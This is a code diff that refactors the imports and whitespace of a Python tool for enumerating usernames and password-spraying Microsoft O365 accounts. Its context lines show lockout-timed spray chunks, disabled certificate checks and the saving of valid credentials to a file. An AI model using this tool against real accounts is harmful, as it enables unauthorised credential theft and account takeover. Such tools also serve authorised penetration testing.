@@ -9,17 +9,15 @@ __version__ = "1.1"
 # -------------------------------
 """A basic username enumeration and password spraying tool aimed at spraying Microsoft O365."""
 
-from re import sub, search
-from time import sleep, time
+import time
+import urllib3
+import argparse
+import concurrent.futures
+import xml.etree.ElementTree as ET
 from asyncio import wait, get_event_loop
-from urllib3 import disable_warnings
-from argparse import ArgumentParser
 from requests import get, options
-from urllib3.exceptions import InsecureRequestWarning
-from concurrent.futures import ThreadPoolExecutor
-from xml.etree.ElementTree import fromstring
 
-disable_warnings(InsecureRequestWarning)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Global variables
 MAX_THREADS = 10
@@ -29,14 +27,12 @@ valid_creds = {} # Password spray storage
 valid_accts = [] # User enumeration storage
 
 
-
 class text_colors:
   """ Colorized output during run """
   red    = "\033[91m"
   green  = "\033[92m"
   yellow = "\033[93m"
   reset  = "\033[0m"
-
 
 
 class Helper:
@@ -69,8 +65,7 @@ class Helper:
 
   def lockout_reset_wait(self, lockout):
     print("[*] Sleeping for %.1f minutes" % (lockout))
-    sleep(lockout * 60)
-
+    time.sleep(lockout * 60)
 
 
 class Validator:
@@ -89,7 +84,7 @@ class Validator:
   def run(self):
     try:
       rsp = get(self.url, proxies=self.proxy, verify=False)
-      xml = fromstring(rsp.text)
+      xml = ET.fromstring(rsp.text)
       nst = xml.find('NameSpaceType').text
 
       if nst in ["Managed", "Federated"]:
@@ -101,7 +96,6 @@ class Validator:
     except Exception as e:
       if self.debug: print(e)
       pass
-
 
 
 class Enumerator:
@@ -121,7 +115,7 @@ class Enumerator:
     }
     self.file_ = user_file
     self.helper   = Helper()
-    self.executor = ThreadPoolExecutor(max_workers=threads)
+    self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
 
   async def run(self):
     """ Asynchronously send HTTP requests """
@@ -155,7 +149,6 @@ class Enumerator:
       pass
 
 
-
 class Sprayer:
   """ Perform password spraying using Microsoft Server ActiveSync """
 
@@ -178,7 +171,7 @@ class Sprayer:
       "http": proxy, "https": proxy
     }
     self.helper   = Helper()
-    self.executor = ThreadPoolExecutor(max_workers=threads)
+    self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
     self.user_list = self.helper.get_list_from_file(user_file)
 
   async def run(self, password_chunk):
@@ -217,7 +210,7 @@ class Sprayer:
 
 
 if __name__ == "__main__":
-  parser = ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer.")
+  parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer.")
   parser.add_argument("-u", "--username", type=str, help="File containing list of usernames")
   parser.add_argument("-p", "--password", type=str, help="File containing list of passwords")
   parser.add_argument("--count", type=int, help="Number of password attempts to run before resetting lockout timer")
@@ -258,7 +251,7 @@ if __name__ == "__main__":
           " password count [--count], and lockout timer in minutes [--lockout].")
       exit(1)
 
-  start = time()
+  start = time.time()
   helper = Helper()
 
   # Perform domain validation
@@ -275,7 +268,7 @@ if __name__ == "__main__":
   # Perform password spray
   elif args.spray:
     spray = Sprayer(args.username, args.domain, args.proxy, args.debug, args.threads)
-    
+
     password_list = helper.get_list_from_file(args.password)
     for password_chunk in helper.get_chunks_from_list(password_list, args.count):
       print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
@@ -285,5 +278,5 @@ if __name__ == "__main__":
 
     helper.print_stats("Password Spraying", valid_creds, ("valid_credentials.txt" if not args.output else args.output))
 
-  elapsed = time() - start
+  elapsed = time.time() - start
   if args.debug: print("\n>> %s executed in %0.2f seconds." % (__file__, elapsed))
